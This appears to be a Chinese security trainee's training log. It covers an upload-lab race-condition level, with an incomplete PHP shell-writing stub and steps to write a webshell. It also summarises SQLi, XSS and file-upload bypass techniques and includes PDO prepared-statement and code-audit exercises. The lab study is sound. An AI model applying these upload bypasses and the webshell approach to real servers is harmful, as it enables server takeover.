<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715163936130.png" alt="image-20220715163936130"></p>
<h4 id="第十七关："><a href="#第十七关：" class="headerlink" title="第十七关："></a>第十七关：</h4><p>思路：</p>
<p>1.准备一个写shell的php脚本文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen())</span><br></pre></td></tr></table></figure>

<p>2.在后端代码保存上传的文件后，在后端代码判断上传文件类型前有一个时间间隙</p>
<p>我们需要快速地访问这个php文件</p>
<p>3.该php文件的功能是写一个shell</p>
<p>4.访问写入的shell</p>
<p>进入爆破模块</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715165617952.png" alt="image-20220715165617952"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715165840582.png" alt="image-20220715165840582"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715165925371.png" alt="image-20220715165925371"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715170149570.png" alt="image-20220715170149570"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715170329834.png" alt="image-20220715170329834"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715170644257.png" alt="image-20220715170644257"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220715172812252.png" alt="image-20220715172812252"></p>
<h2 id="0717第六天"><a href="#0717第六天" class="headerlink" title="0717第六天"></a>0717第六天</h2><h3 id="今日安排："><a href="#今日安排：" class="headerlink" title="今日安排："></a>今日安排：</h3><p>1.总结上周内容</p>
<p>2.代码审计</p>
<p>  0）php功能熟悉</p>
<p>  1）php入门及代码编写</p>
<p>   2）php网页应用的手工代码审计</p>
<p>   3）php应用代码审计工具使用</p>
<h3 id="任务一-漏洞总结"><a href="#任务一-漏洞总结" class="headerlink" title="任务一.漏洞总结"></a>任务一.漏洞总结</h3><h5 id="1-网站的架构及搭建，以LNMP为例子"><a href="#1-网站的架构及搭建，以LNMP为例子" class="headerlink" title="1.网站的架构及搭建，以LNMP为例子"></a>1.网站的架构及搭建，以LNMP为例子</h5><p>1）架构理解：</p>
<p>LNMP：linux、nginx、mysql、php</p>
<p>nginx：中间件，接收用户的http请求，返回静态资源内容给http客户端，或者转交动态脚本解析请求给动态脚本解析器，将接收到的解析结果连同其他HTML内容返回给HTTP客户端</p>
<p>php：接受中间件的动态脚本解析请求。将解析后的结果返回中间件</p>
<p>MySQL：接收PHP的查询请求（广义）、返回执行或查询的结果</p>
<p>2）环境搭建</p>
<p>a.安装os，配置更新源，添加多线程安装包下载工具</p>
<p>b.安装三大组件，并且配制成自启动</p>
<p>c.配置三大组件，为其分配新用户和权限（用户身份、文件及目录读写权限、db权限等）</p>
<p>4.重启三大组件</p>
<h5 id="2-SQLi"><a href="#2-SQLi" class="headerlink" title="2.SQLi"></a>2.SQLi</h5><p>攻击者将恶意SQL代码片段附加到提交的参数上，然后提交到服务器执行预期外的db查询</p>
<p>危害：拖库、文件读写、命令执行</p>
<p>类型：数字型、字符型；get型，post型</p>
<p>其他类型：联合查询注入，报错注入，布尔盲注，延时注入，写文件注入等</p>
<p>防护思路：正确使用预编译技术，对敏感字符进行识别和拦截</p>
<h5 id="2-XSS"><a href="#2-XSS" class="headerlink" title="2.XSS"></a>2.XSS</h5><p>攻击者设法将自己恶意的js代码让受害者浏览器（或electron架构应用）受伤害</p>
<p>危害：页面篡改、cookie盗取、网络钓鱼</p>
<p>防护思路：1.对前端提交的字符进行实体化编码，含js字符串中字母； 2.采用成熟的前后端富文本输入和渲染框架</p>
<p>绕过手法：</p>
<p>​     1.通过不同的js引入方式进行绕过；</p>
<p>​			1.常规script标签引入</p>
<pre><code>         2.构造新的元素属性值对的方式引入，如input的事件属性
</code></pre>
<p>​			 3.通过a标签的src属性值引入</p>
<p>​    	     4.img、svg</p>
<p>​     2.常规的绕过：大小写绕过、双写绕过等；</p>
<h5 id="3-文件上传"><a href="#3-文件上传" class="headerlink" title="3.文件上传"></a>3.文件上传</h5><p>由于后端开发者未对前端传入的文件拓展名和内容进行正确的识别和处理，导致攻击者上传的包含动态脚本的恶意代码文件被执行</p>
<p>危害：覆盖正常的文件内容、写入木马（webshell)、控制服务器</p>
<p>绕过手法：</p>
<p>​	1.前端绕过</p>
<p>​	2.后端绕过</p>
<p>​		1).黑名单绕过</p>
<p>​				1.生僻拓展名绕过</p>
<p>​				2.大小写</p>
<p>​				3.空格</p>
<pre><code>            4..
</code></pre>
<p>​				5.::$DATA</p>
<p>​				6.图片马绕过</p>
<p>​				7..htaccess</p>
<p>​		2).白名单绕过</p>
<p>​				1.00截断</p>
<p>​				2.条件竞争</p>
<p>​				3.解析漏洞</p>
<p>防护思路：</p>
<ol>
<li>使用白名单策略核查上传的文件类型；</li>
<li>升级网站组件</li>
<li>完善文件上传检测的逻辑，明确核查的对象是文件名和临时文件</li>
</ol>
<h3 id="任务二-PHP功能熟悉"><a href="#任务二-PHP功能熟悉" class="headerlink" title="任务二.PHP功能熟悉"></a>任务二.PHP功能熟悉</h3><p>​       </p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220717100551243.png" alt="image-20220717100551243"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220717100723409.png" alt="image-20220717100723409"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220717100823602.png" alt="image-20220717100823602"></p>
<p>都部署在服务器上</p>
<p>小练习：</p>
<p>input.html</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;welcome.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">name:&lt;input type=&quot;text&quot; name=&quot;fname&quot;&gt;</span><br><span class="line">age:&lt;input type=&quot;text&quot; name=&quot;age&quot;&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>welcome.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;welcome.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">name:&lt;input type=&quot;text&quot; name=&quot;fname&quot;&gt;</span><br><span class="line">age:&lt;input type=&quot;text&quot; name=&quot;age&quot;&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220717102138675.png" alt="image-20220717102138675"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220717102108432.png" alt="image-20220717102108432"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220717102924480.png" alt="image-20220717102924480"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220717103318754.png" alt="image-20220717103318754"></p>
<h3 id="任务3-PHP编写安全的SQL查询功能"><a href="#任务3-PHP编写安全的SQL查询功能" class="headerlink" title="任务3 PHP编写安全的SQL查询功能"></a>任务3 PHP编写安全的SQL查询功能</h3><ol>
<li><p>熟悉和练习参考网站中关于PDO方式管理MySQL的例子。范围：“PHP MySQL 简介”——》“PHP MySQL 读取数据”。</p>
</li>
<li><p>编写一个功能，安全实现以下功能（攻击者无法利用该功能进行SQL注入）：</p>
<ol>
<li><p>根据前端输入id，返回用户账号和密码</p>
</li>
<li><p>所需数据库使用之前所练习的sqli-labs中的security库。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;&lt;table style=&#x27;border: solid 1px black;&#x27;&gt;&quot;;</span><br><span class="line">echo &quot;&lt;tr&gt;&lt;th&gt;username&lt;/th&gt;&lt;th&gt;password&lt;/th&gt;&lt;/tr&gt;&quot;;</span><br><span class="line">class TableRows extends RecursiveIteratorIterator &#123;</span><br><span class="line">    function __construct($it) &#123; </span><br><span class="line">        parent::__construct($it, self::LEAVES_ONLY); </span><br><span class="line">    &#125; </span><br><span class="line">    function current() &#123;</span><br><span class="line">        return &quot;&lt;td style=&#x27;width:150px;border:1px solid black;&#x27;&gt;&quot; . </span><br><span class="line">        parent::current(). &quot;&lt;/td&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function beginChildren() &#123; </span><br><span class="line">        echo &quot;&lt;tr&gt;&quot;; </span><br><span class="line">    &#125;  </span><br><span class="line">    function endChildren() &#123; </span><br><span class="line">        echo &quot;&lt;/tr&gt;&quot; . &quot;\n&quot;;  &#125; </span><br><span class="line">&#125; </span><br><span class="line">$servername = &quot;localhost&quot;;</span><br><span class="line">$username = &quot;root&quot;;</span><br><span class="line">$password = &quot;root&quot;;</span><br><span class="line">$dbname = &quot;security&quot;;   </span><br><span class="line">try &#123;</span><br><span class="line">   $conn = new PDO(&quot;mysql:host=$servername;dbname=$dbname&quot;, $username, $password);</span><br><span class="line">   $conn-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span><br><span class="line">   $fid=$_POST[&#x27;fid&#x27;];</span><br><span class="line">   $age=$_POST[&#x27;age&#x27;];</span><br><span class="line">   $stmt = $conn-&gt;prepare(&quot;SELECT username, &#x27;password&#x27; FROM users where id=:fid&quot;); </span><br><span class="line">   $stmt-&gt;bindParam(&#x27;:fid&#x27;,$fid);</span><br><span class="line">   $stmt-&gt;execute();  </span><br><span class="line">   $result = $stmt-&gt;setFetchMode(PDO::FETCH_ASSOC); </span><br><span class="line">   foreach(new TableRows(new RecursiveArrayIterator($stmt-&gt;fetchAll())) as $k=&gt;$v) &#123; </span><br><span class="line">        echo $v;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line">catch(PDOException $e) &#123;</span><br><span class="line">    echo &quot;Error: &quot; . $e-&gt;getMessage();&#125;</span><br><span class="line">$conn = null;</span><br><span class="line">echo &quot;&lt;/table&gt;&quot;;?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">创建数据库</span><br><span class="line">&lt;!-- &lt;?php</span><br><span class="line"></span><br><span class="line">try &#123;</span><br><span class="line">    $conn = new PDO(&quot;mysql:host=$servername;dbname=$dbname&quot;, $username, $password);</span><br><span class="line">    // 设置 PDO 错误模式，用于抛出异常</span><br><span class="line">    $conn-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span><br><span class="line"> </span><br><span class="line">    // 使用 sql 创建数据表</span><br><span class="line">    $sql = &quot;CREATE TABLE demo (</span><br><span class="line">    id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY, </span><br><span class="line">    demoname VARCHAR(30) NOT NULL,</span><br><span class="line">    age INT(6) NOT NULL</span><br><span class="line">    )&quot;;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    // 使用 exec() ，没有结果返回 </span><br><span class="line">    $conn-&gt;exec($sql);</span><br><span class="line">    echo &quot;数据表 MyGuests 创建成功&quot;;</span><br><span class="line">&#125;</span><br><span class="line">catch(PDOException $e)</span><br><span class="line">&#123;</span><br><span class="line">    echo $sql . &quot;&lt;br&gt;&quot; . $e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$conn = null;</span><br><span class="line">?&gt; --&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220717141953964.png" alt="image-20220717141953964"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220717142033864.png" alt="image-20220717142033864"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220717142047576.png" alt="image-20220717142047576"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$servername = &quot;localhost&quot;;</span><br><span class="line">$username = &quot;root&quot;;</span><br><span class="line">$password = &quot;root&quot;;</span><br><span class="line">$dbname = &quot;security&quot;;</span><br><span class="line"> </span><br><span class="line">try &#123;</span><br><span class="line">    $conn = new PDO(&quot;mysql:host=$servername;dbname=$dbname&quot;, $username, $password);</span><br><span class="line">    // 设置 PDO 错误模式为异常</span><br><span class="line">    $conn-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span><br><span class="line"> </span><br><span class="line">    // 预处理 SQL 并绑定参数</span><br><span class="line">    $stmt = $conn-&gt;prepare(&quot;SELECT * FROM users WHERE id = :id&quot;);</span><br><span class="line">    $stmt-&gt;bindParam(&#x27;:id&#x27;, $id);</span><br><span class="line"> </span><br><span class="line">    // 插入行</span><br><span class="line">    $id = $_REQUEST[&#x27;id&#x27;];</span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    $user = $stmt-&gt;fetchAll();</span><br><span class="line">	</span><br><span class="line">	foreach($user as $key=&gt;$val)&#123;</span><br><span class="line">		echo &#x27;id:&#x27;.$val[&#x27;id&#x27;].&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">		echo &#x27;name:&#x27;.$val[&#x27;username&#x27;].&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">		echo &#x27;pass:&#x27;.$val[&#x27;password&#x27;].&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">    echo &quot;查询完成！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">catch(PDOException $e)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;Error: &quot; . $e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">$conn = null;</span><br><span class="line">?&gt;</span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="任务4-SQLi代码审计"><a href="#任务4-SQLi代码审计" class="headerlink" title="任务4.SQLi代码审计"></a>任务4.SQLi代码审计</h3><p>漏洞原因（代码层级）</p>
<p>1.采用了过时的DBMS连接方式</p>
<p>mysql_connect</p>
<p>2.未正确地进行预编译查询</p>
<p>审计点：mysql（）、pdo</p>
<p>如直接拼接未进行绑定</p>
<p>未进行预编译</p>
<p>未正确初始化预编译选项导致宽字节注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;Less-1 **Error Based- String**&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=&quot;#000000&quot;&gt;</span><br><span class="line">&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$servername = &quot;localhost&quot;;</span><br><span class="line">$username = &quot;root&quot;;</span><br><span class="line">$password = &quot;root&quot;;</span><br><span class="line">$dbname = &quot;security&quot;; </span><br><span class="line">if(isset($_GET[&#x27;id&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">  $id=$_GET[&#x27;id&#x27;];</span><br><span class="line">// connectivity </span><br><span class="line">try &#123;</span><br><span class="line">  $conn = new PDO(&quot;mysql:host=$servername;dbname=$dbname&quot;, $username, $password);</span><br><span class="line">  // 设置 PDO 错误模式为异常</span><br><span class="line">  $conn-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span><br><span class="line">  // 预处理 SQL 并绑定参数</span><br><span class="line">  $stmt = $conn-&gt;prepare(&quot;SELECT * FROM users WHERE id = :id&quot;);</span><br><span class="line">  $stmt-&gt;bindParam(&#x27;:id&#x27;, $id);</span><br><span class="line">  // 插入行</span><br><span class="line">  $id = $_REQUEST[&#x27;id&#x27;];</span><br><span class="line">  $stmt-&gt;execute();</span><br><span class="line">  $user = $stmt-&gt;fetchAll();</span><br><span class="line"></span><br><span class="line">   foreach($user as $key=&gt;$val)&#123;</span><br><span class="line">  </span><br><span class="line">	if($val)&#123;</span><br><span class="line">  	echo &quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;;</span><br><span class="line">  	echo &#x27;Your Login name:&#x27;. $val[&#x27;username&#x27;];</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  	echo &#x27;Your Password:&#x27; .$val[&#x27;password&#x27;];</span><br><span class="line">  	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	</span><br><span class="line">   &#125;	</span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br><span class="line">catch(PDOException $e)</span><br><span class="line">&#123;</span><br><span class="line">  echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;.&quot;Error: &quot; . $e-&gt;getMessage().&quot;&lt;/font&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$conn = null;	</span><br><span class="line">&#125;</span><br><span class="line">	else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=&quot;../images/Less-1.jpg&quot; /&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220717162022695.png" alt="image-20220717162022695"></p>
<h3 id="任务5-部署安全的文件上传demo脚本"><a href="#任务5-部署安全的文件上传demo脚本" class="headerlink" title="任务5.部署安全的文件上传demo脚本"></a>任务5.部署安全的文件上传demo脚本</h3><p>漏洞原因（代码层级）</p>
<p>1.后端程序未正确识别和处理上传文件的扩展名、大小和内容</p>
<p>审计点：move_uploaded_file()</p>
<h3 id="任务6-XSS代码审计"><a href="#任务6-XSS代码审计" class="headerlink" title="任务6.XSS代码审计"></a>任务6.XSS代码审计</h3><p>审计点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_GET</span><br><span class="line">$_POST</span><br><span class="line">$_REQUEST</span><br><span class="line">$_COOKIE</span><br><span class="line">前端提交的</span><br></pre></td></tr></table></figure>

<p>看前端提交的参数在输入后、输出前有否进行识别、转义等，</p>
<h3 id="任务7-使用手工或seay代码审计工具审计btslab靶场代码的漏洞"><a href="#任务7-使用手工或seay代码审计工具审计btslab靶场代码的漏洞" class="headerlink" title="任务7.使用手工或seay代码审计工具审计btslab靶场代码的漏洞"></a>任务7.使用手工或seay代码审计工具审计btslab靶场代码的漏洞</h3><p>1.下载btslab靶场并部署</p>
<p>2.下载seay</p>
<p>3.关键功能及代码对照审计</p>
<p>打开seay，打开文件夹bts</p>
<p>进行自动审计</p>
<p>发现：</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220717170327019.png" alt="image-20220717170327019"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220717170205240.png" alt="image-20220717170205240"></p>
<p>正确的做法应该是，改造的关键代码如下：</p>
<h3 id="任务8-代码审计小结"><a href="#任务8-代码审计小结" class="headerlink" title="任务8.代码审计小结"></a>任务8.代码审计小结</h3><p>三种审计方法</p>
<p>1.代码通读审计</p>
<p>2.危险函数审计</p>
<p>3.关键功能及代码对照审计</p>
<h3 id="报告编写内容"><a href="#报告编写内容" class="headerlink" title="报告编写内容"></a>报告编写内容</h3><p>1.附上小结</p>
<p>完成下列目标并编写报告，报告仅写关键思路和步骤</p>
<p>1.利用seay审计出一个sqli漏洞（可以是sqli-lab或btslab中漏洞）</p>
<p>2.然后改造相关功能，使其无法注入</p>
<h2 id="0718第七天"><a href="#0718第七天" class="headerlink" title="0718第七天"></a>0718第七天</h2><h3 id="今日任务"><a href="#今日任务" class="headerlink" title="今日任务"></a>今日任务</h3><p>1.爬虫编写</p>
<p>2.系统及组件加固</p>
<h3 id="目标1-爬虫编写"><a href="#目标1-爬虫编写" class="headerlink" title="目标1 爬虫编写"></a>目标1 爬虫编写</h3><p>定义：网络上搜集各类信息的程序</p>
<p>网页爬虫，HTTP协议</p>
<p>实现路径：通过python语言及httpx（request）模块实现爬虫</p>
<p>意义：编写自动化的安全检测脚本工具</p>
<h3 id="任务1-掌握和认识python编程"><a href="#任务1-掌握和认识python编程" class="headerlink" title="任务1.掌握和认识python编程"></a>任务1.掌握和认识python编程</h3><p>定义列表并枚举</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">arrayDemo=[1,2,3,4,26]</span><br><span class="line"></span><br><span class="line">for item in arrayDemo:</span><br><span class="line">  print(item)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">快速定义列表（数组）</span><br><span class="line">a=range(1,11)</span><br><span class="line">a=list(a)</span><br><span class="line">for i in a:</span><br><span class="line">	print(i)</span><br></pre></td></tr></table></figure>

<p>定义函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def max(a, b):</span><br><span class="line">    if a &gt; b:</span><br><span class="line">        return a</span><br><span class="line">    else:</span><br><span class="line">        return b</span><br><span class="line"> </span><br><span class="line">a = 4</span><br><span class="line">b = 5</span><br><span class="line">print(max(a, b))</span><br></pre></td></tr></table></figure>

<h3 id="任务2-使用python3编写一个底部具有11个星号的三角形"><a href="#任务2-使用python3编写一个底部具有11个星号的三角形" class="headerlink" title="任务2.使用python3编写一个底部具有11个星号的三角形"></a>任务2.使用python3编写一个底部具有11个星号的三角形</h3><p>关于三角形：底部有三个三角形的样子</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">  *</span><br><span class="line"> ***</span><br><span class="line">*****</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(1,12,2):</span><br><span class="line">    for j in range(0, 10 - i):</span><br><span class="line">        print(end=&quot; &quot;)</span><br><span class="line">    for k in range(10 - i, 10):</span><br><span class="line">        print(&quot;*&quot;, end=&quot; &quot;)</span><br><span class="line"></span><br><span class="line">    print(&quot;&quot;)</span><br><span class="line">    </span><br><span class="line">for n in range(1,12,2):</span><br><span class="line">  print(int((11-n)/2)*&#x27; &#x27;+n*&#x27;*&#x27;)</span><br><span class="line">  </span><br></pre></td></tr></table></figure>

